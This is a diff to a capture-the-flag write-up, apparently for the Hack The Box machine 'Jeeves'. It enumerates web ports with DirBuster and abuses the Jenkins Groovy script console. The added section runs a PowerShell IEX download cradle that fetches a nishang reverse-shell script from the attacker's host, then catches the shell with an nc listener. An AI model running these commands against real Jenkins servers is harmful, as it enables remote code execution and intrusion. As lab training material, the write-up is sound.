@@ -30,14 +30,16 @@ two http ports stand out
 Going to run dirbuster on them
 80, 50000
 
-### Running Dirbuster on IIS 10.0
+## Running Dirbuster 
+
+### on IIS 10.0
 ```
 dirbuster -u http://10.10.10.63 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
 Starting OWASP DirBuster 1.0-RC1
 Starting dir/file list based brute forcing
 ```
 
-### Running Dirbuster on JETTY 9.4
+### on JETTY 9.4
 ```
 dirbuster -u http://10.10.10.63:50000 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
 Starting OWASP DirBuster 1.0-RC1
@@ -63,7 +65,9 @@ println(Jenkins.instance.pluginManager.plugins)
 
 All the classes from all the plugins are visible. jenkins.*, jenkins.model.*, hudson.*, and hudson.model.* are pre-imported.
 
-### Groovy Script Test
+## Groovy Script Testing
+
+### Simple WHoami
 ```
 cmd = "whoami"
 println cmd.execute().text
@@ -72,7 +76,7 @@ Result
 
 jeeves\kohsuke
 ```	
-
+### Running deeper directory traversal
 ```
 cmd = "cmd.exe /c dir"
 println cmd.execute().text
@@ -123,7 +127,50 @@ Result
               24 File(s)     74,753,892 bytes
               12 Dir(s)   7,267,758,080 bytes free
 
+``` 
+
+Now that there is discovered script access > we can move onto shell access
+Google Search > found nishang powershell framework
+Created www folder added Invoke-PowerShellTcp.ps1 (Added Example line to bottom of file to run)
+Created a NC listener for powershell execution
+
+## Testing for Shell access
+
+### runnimg Grovy download sCript
 ```
+cmd = """powershell "IEX(new-object net.webclient).downloadstring('http://10.10.14.59/test.ps1')" """
+println cmd.execute().text
+
+
+nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.59] from (UNKNOWN) [10.10.10.63] 49680
+Windows PowerShell running as user kohsuke on JEEVES
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator\.jenkins>whoami
+jeeves\kohsuke
+```
+
+Now that we have a shell with a viable user... let's see if this user has a user.txt
+
+## User.txt
+
+```
+PS C:\Users\kohsuke\Desktop> dir
+
+
+    Directory: C:\Users\kohsuke\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---        11/3/2017  11:22 PM             32 user.txt  
+```
+
+
+
+
 
 
 
